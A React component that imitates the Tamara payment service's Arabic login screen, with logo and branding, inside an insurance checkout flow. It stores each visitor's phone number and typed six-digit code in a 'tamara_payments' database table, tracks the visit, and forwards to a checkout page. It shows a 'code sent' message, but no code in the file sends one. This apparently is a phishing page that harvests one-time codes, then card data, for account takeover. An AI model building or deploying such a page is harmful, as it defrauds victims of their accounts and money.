import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import tamaraLogo from "@/assets/tamara-logo.png";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";

const TamaraLogin = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [otpSent, setOtpSent] = useState(false);
  const [otp, setOtp] = useState("");
  const [agreedToTerms, setAgreedToTerms] = useState(false);
  const [timer, setTimer] = useState(24);
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const sessionId = useVisitorTracking();
  const price = searchParams.get("price") || "0";
  const company = searchParams.get("company") || "";

  // Scroll to top on mount
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  // Track tamara login page visit
  useEffect(() => {
    const trackPageVisit = async () => {
      const visitorSessionId = sessionStorage.getItem("visitor_session_id");
      if (visitorSessionId) {
        await supabase.from('visitor_events').insert({
          session_id: visitorSessionId,
          event_type: 'tamara_otp_page_visit',
          page_url: window.location.pathname,
          event_data: {
            company: company,
            price: price,
            timestamp: new Date().toISOString()
          }
        });
      }
    };
    
    trackPageVisit();
  }, [company, price]);

  useEffect(() => {
    if (otpSent && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [otpSent, timer]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    // Only allow input if it starts with 5 or is empty
    if (value.length === 0 || value.startsWith("5")) {
      if (value.length <= 9) {
        setPhoneNumber(value);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      // إنشاء سجل دفع فوراً مع رقم الهاتف
      const { data, error } = await supabase
        .from("tamara_payments")
        .insert({
          phone: `966${phoneNumber}`,
          total_amount: parseFloat(price),
          monthly_payment: parseFloat(price) / 4,
          company: company,
          cardholder_name: "في انتظار الإدخال",
          card_number_last4: "0000",
          payment_status: "pending",
          visitor_session_id: sessionId,
        })
        .select()
        .single();

      if (error) throw error;
      
      setPaymentId(data.id);
      setOtpSent(true);
      setTimer(24);
      
      toast({
        title: "تم الإرسال",
        description: "تم إرسال رمز التحقق إلى رقم هاتفك",
      });
    } catch (error) {
      console.error("Error creating payment:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في إرسال رمز التحقق",
        variant: "destructive",
      });
    }
  };

  const handleResendOtp = () => {
    setTimer(24);
    console.log("Resending OTP to:", phoneNumber);
  };

  const handleVerifyOtp = async () => {
    if (otp.length === 6 && agreedToTerms && paymentId) {
      try {
        // تحديث السجل مع OTP التحقق من الهاتف
        const { error } = await supabase
          .from("tamara_payments")
          .update({
            otp_code: otp,
          })
          .eq("id", paymentId);

        if (error) throw error;

        // الانتقال لصفحة الدفع مع paymentId
        navigate(`/tamara-checkout?company=${encodeURIComponent(company)}&price=${price}&paymentId=${paymentId}`);
      } catch (error) {
        console.error("Error verifying OTP:", error);
        toast({
          title: "خطأ",
          description: "حدث خطأ في التحقق من الرمز",
          variant: "destructive",
        });
      }
    }
  };

  if (!otpSent) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex items-center justify-center p-4" dir="rtl">
        <div className="w-full max-w-md">
          {/* Tamara Logo */}
          <div className="flex justify-center mb-8">
            <div className="w-32 h-12 flex items-center justify-center">
              <img src={tamaraLogo} alt="تمارا" className="w-full h-full object-contain" />
            </div>
          </div>

          {/* Login Card */}
          <div className="bg-white rounded-2xl shadow-lg p-8">
            <h1 className="text-2xl font-bold text-center mb-2">أدخل رقم الجوال</h1>
            <p className="text-center text-muted-foreground text-sm mb-8">
              سيتم إرسال رمز للمتابعة
            </p>

            <form onSubmit={handleSubmit}>
              <div className="mb-6">
                <label className="block text-sm font-medium mb-2 text-right">
                  رقم الجوال
                </label>
                <div className="flex items-center gap-2 border-2 border-primary/30 rounded-lg p-3 focus-within:border-primary transition-colors">
                  <div className="flex items-center gap-2 border-l pl-3">
                    <span className="text-lg">🇸🇦</span>
                    <span className="font-medium text-muted-foreground">+966</span>
                  </div>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    placeholder="5x xxx xxxx"
                    className="flex-1 outline-none text-lg font-medium"
                    required
                  />
                </div>
              </div>

              <Button 
                type="submit" 
                className="w-full bg-black hover:bg-black/90 text-white h-12 text-base rounded-lg"
                disabled={phoneNumber.length < 9}
              >
                أرسل الرمز
              </Button>
            </form>
          </div>

          {/* Order Info */}
          <div className="mt-6 text-center text-sm text-muted-foreground">
            <p>قيمة الطلب: {price} ر.س</p>
            <p className="mt-1">شركة التأمين: {company}</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex items-center justify-center p-4" dir="rtl">
      <div className="w-full max-w-md">
        {/* Tamara Logo */}
        <div className="flex justify-center mb-8">
          <div className="w-32 h-12 flex items-center justify-center">
            <img src={tamaraLogo} alt="تمارا" className="w-full h-full object-contain" />
          </div>
        </div>

        {/* OTP Verification Card */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          <h1 className="text-2xl font-bold text-center mb-6">تحقق من رقمك</h1>

          {/* Phone Number Display */}
          <div className="border-2 border-gray-200 rounded-lg p-4 mb-4 flex items-center justify-between">
            <div className="text-right flex-1">
              <div className="text-lg font-semibold">966 {phoneNumber}</div>
              <button
                type="button"
                onClick={() => setOtpSent(false)}
                className="text-sm text-primary hover:underline"
              >
                تحتاج تغيير الرقم؟
              </button>
            </div>
            <div className="w-8 h-8 border-2 border-gray-300 rounded flex items-center justify-center">
              <span className="text-gray-400">📱</span>
            </div>
          </div>

          {/* SMS Sent Message */}
          <p className="text-center text-sm text-muted-foreground mb-6">
            لقد أرسلنا للتو رمز التحقق عبر الرسائل القصيرة
          </p>

          {/* OTP Input */}
          <div className="flex justify-center mb-6" dir="ltr">
            <InputOTP
              maxLength={6}
              value={otp}
              onChange={(value) => setOtp(value)}
            >
              <InputOTPGroup className="gap-3">
                <InputOTPSlot index={0} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                <InputOTPSlot index={1} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                <InputOTPSlot index={2} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                <InputOTPSlot index={3} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                <InputOTPSlot index={4} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                <InputOTPSlot index={5} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {/* Resend Timer */}
          <div className="text-center mb-6">
            {timer > 0 ? (
              <p className="text-sm text-muted-foreground">
                إعادة الإرسال في 00:{timer.toString().padStart(2, "0")}
              </p>
            ) : (
              <button
                type="button"
                onClick={handleResendOtp}
                className="text-sm text-primary hover:underline"
              >
                إعادة إرسال الرمز
              </button>
            )}
          </div>

          {/* Terms Checkbox */}
          <div className="flex items-start gap-3 mb-6" dir="rtl">
            <Checkbox
              id="terms"
              checked={agreedToTerms}
              onCheckedChange={(checked) => setAgreedToTerms(checked as boolean)}
              className="mt-1"
            />
            <label htmlFor="terms" className="text-sm text-right cursor-pointer">
              أوافق على{" "}
              <a href="#" className="text-primary hover:underline">
                شروط وأحكام تمارا
              </a>
            </label>
          </div>

          {/* Verify Button */}
          <Button
            onClick={handleVerifyOtp}
            className="w-full bg-black hover:bg-black/90 text-white h-12 text-base rounded-lg"
            disabled={otp.length < 6 || !agreedToTerms}
          >
            تحقق
          </Button>
        </div>

        {/* Order Info */}
        <div className="mt-6 text-center text-sm text-muted-foreground">
          <p>قيمة الطلب: {price} ر.س</p>
          <p className="mt-1">شركة التأمين: {company}</p>
        </div>
      </div>
    </div>
  );
};

export default TamaraLogin;
